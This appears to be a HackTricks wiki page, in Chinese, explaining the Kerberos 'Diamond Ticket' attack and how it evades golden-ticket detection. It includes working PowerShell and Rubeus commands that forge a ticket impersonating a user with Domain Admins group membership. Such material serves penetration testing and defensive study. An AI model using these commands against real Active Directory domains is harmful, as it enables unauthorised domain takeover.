# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**像金票一样**，钻石票是一个可以用来**以任何用户身份访问任何服务**的TGT。金票是完全离线伪造的，使用该域的krbtgt哈希加密，然后传递到登录会话中使用。由于域控制器不跟踪它（或他们）合法发出的TGT，它们会乐意接受使用其自身krbtgt哈希加密的TGT。

检测金票使用的两种常见技术是：

- 查找没有相应AS-REQ的TGS-REQ。
- 查找具有荒谬值的TGT，例如Mimikatz的默认10年有效期。

**钻石票**是通过**修改由DC发出的合法TGT的字段**来制作的。这是通过**请求**一个**TGT**，**使用**域的krbtgt哈希**解密**它，**修改**票证的所需字段，然后**重新加密**它来实现的。这**克服了金票的两个上述缺点**，因为：

- TGS-REQ将有一个前置的AS-REQ。
- TGT是由DC发出的，这意味着它将具有来自域Kerberos策略的所有正确细节。尽管这些可以在金票中准确伪造，但更复杂且容易出错。
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
